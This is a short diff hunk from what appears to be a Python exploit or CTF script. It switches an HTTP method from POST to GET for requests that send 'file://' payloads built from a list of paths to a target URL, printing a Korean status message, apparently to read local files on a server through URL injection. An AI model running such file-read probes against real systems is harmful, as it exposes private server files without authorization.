@@ -63,7 +63,7 @@ for p in paths_to_check:
     payload = f"file://{full_path}"
     print(f"[+] 요청 중: {payload}")
     try:
-        res = requests.post(
+        res = requests.get(
             TARGET_URL,
             data={"URL": payload},
             verify=False,
